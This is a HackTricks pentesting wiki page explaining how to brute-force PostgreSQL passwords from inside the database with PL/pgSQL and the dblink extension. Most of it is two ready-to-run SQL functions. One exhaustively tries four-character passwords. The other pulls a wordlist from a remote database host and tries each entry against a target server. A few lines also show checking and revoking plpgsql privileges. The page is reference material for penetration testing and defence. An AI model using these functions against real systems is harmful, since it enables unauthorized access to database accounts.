---
title: "PL/pgSQL Password Bruteforce"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: web
---

```
SELECT lanname,lanacl FROM pg_language WHERE lanname = 'plpgsql';
     lanname | lanacl
    ---------+---------
     plpgsql |
```
```
REVOKE ALL PRIVILEGES ON LANGUAGE plpgsql FROM PUBLIC;
```
```
SELECT lanname,lanacl FROM pg_language WHERE lanname = 'plpgsql';
     lanname | lanacl
    ---------+-----------------
     plpgsql | {admin=U/admin}
```
```
CREATE EXTENSION dblink;
```
## Password Brute Force

Here how you could perform a 4 chars password bruteforce:[\[1\]](#references)

```
//Create the brute-force function
CREATE OR REPLACE FUNCTION brute_force(host TEXT, port TEXT,
                                username TEXT, dbname TEXT) RETURNS TEXT AS
$$
DECLARE
    word TEXT;
BEGIN
    FOR a IN 65..122 LOOP
        FOR b IN 65..122 LOOP
            FOR c IN 65..122 LOOP
                FOR d IN 65..122 LOOP
                    BEGIN
                        word := chr(a) || chr(b) || chr(c) || chr(d);
                        PERFORM(SELECT * FROM dblink(' host=' || host ||
                                                    ' port=' || port ||
                                                    ' dbname=' || dbname ||
                                                    ' user=' || username ||
                                                    ' password=' || word,
                                                    'SELECT 1')
                                                    RETURNS (i INT));
                                                    RETURN word;
                        EXCEPTION
                            WHEN sqlclient_unable_to_establish_sqlconnection
                                THEN
                                    -- do nothing
                    END;
                END LOOP;
            END LOOP;
        END LOOP;
    END LOOP;
    RETURN NULL;
END;
$$ LANGUAGE 'plpgsql';
//Call the function
select brute_force('127.0.0.1', '5432', 'postgres', 'postgres');
```
*Note that even brute-forcing 4 characters may take several minutes.*

You could also **download a wordlist** and try only those passwords (dictionary attack):

```
//Create the function
CREATE OR REPLACE FUNCTION brute_force(host TEXT, port TEXT,
                                username TEXT, dbname TEXT) RETURNS TEXT AS
$$
BEGIN
    FOR word IN (SELECT word FROM dblink('host=1.2.3.4
                                            user=name
                                            password=qwerty
                                            dbname=wordlists',
                                            'SELECT word FROM wordlist')
                                        RETURNS (word TEXT)) LOOP
        BEGIN
            PERFORM(SELECT * FROM dblink(' host=' || host ||
                                            ' port=' || port ||
                                            ' dbname=' || dbname ||
                                            ' user=' || username ||
                                            ' password=' || word,
                                            'SELECT 1')
                                        RETURNS (i INT));
            RETURN word;
            EXCEPTION
                WHEN sqlclient_unable_to_establish_sqlconnection THEN
                    -- do nothing
        END;
    END LOOP;
    RETURN NULL;
END;
$$ LANGUAGE 'plpgsql'
-- Call the function
select brute_force('127.0.0.1', '5432', 'postgres', 'postgres');
```
## References

- [1] [Having Fun With PostgreSQL](http://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.txt)
- [2] [PostgreSQL documentation — PL/pgSQL overview](https://www.postgresql.org/docs/current/plpgsql-overview.html)
- [3] [PostgreSQL documentation — Schemas and privileges](https://www.postgresql.org/docs/current/ddl-schemas.html)
